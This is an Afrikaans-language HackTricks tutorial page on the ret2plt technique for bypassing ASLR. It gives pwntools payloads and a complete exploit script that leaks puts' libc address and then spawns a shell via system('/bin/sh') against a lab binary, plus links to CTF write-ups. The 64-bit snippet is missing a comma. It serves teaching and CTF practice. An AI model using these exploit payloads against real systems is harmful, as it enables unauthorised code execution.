# Ret2plt

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

Die doel van hierdie tegniek sou wees om **'n adres van 'n funksie van die PLT te lek** om ASLR te kan omseil. Dit is omdat as jy byvoorbeeld die adres van die funksie `puts` van die libc lek, kan jy dan **bereken waar die basis van `libc` is** en afsette bereken om ander funksies soos **`system`** te kan benader.

Dit kan gedoen word met 'n `pwntools` lading soos ([**van hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Merk op hoe **`puts`** (met die adres van die PLT) geroep word met die adres van `puts` wat in die `GOT` gele√´ is. Dit is omdat teen die tyd dat `puts` die `GOT` inskrywing van puts druk, sal hierdie **inskrywing die adres van `puts` in die geheue bevat**.

Merk ook op hoe die adres van `main` in die aanval gebruik word sodat wanneer `puts` sy uitvoering be√´indig, die **bin√™re `main` weer roep in plaas van om af te sluit** (sodat die uitgelekte adres geldig bly).

{% hint style="danger" %}
Merk op hoe om hierdie te laat werk, moet die **bin√™re nie met PIE saamgestel word nie** of jy moet 'n lek gevind het om PIE te omseil om die adres van die `PLT`, `GOT` en `main` te weet.
{% endhint %}

Jy kan 'n [**volledige voorbeeld van hierdie omseiling hier vind**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Dit was die finale aanval van daardie voorbeeld:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Ander voorbeelde & Verwysings

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64-bis, ASLR geaktiveer maar geen PIE, die eerste stap is om 'n oorvloei te vul tot by die byte 0x00 van die kanarie om dan puts te roep en dit te lek. Met die kanarie word 'n ROP-gadget geskep om puts te roep om die adres van puts van die GOT te lek en dan 'n ROP-gadget om `system('/bin/sh')` te roep.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64-bis, ASLR geaktiveer, geen kanarie, stapeloorvloei in hoof van 'n kindfunksie. ROP-gadget om puts te roep om die adres van puts van die GOT te lek en dan 'n enkele gadget te roep.
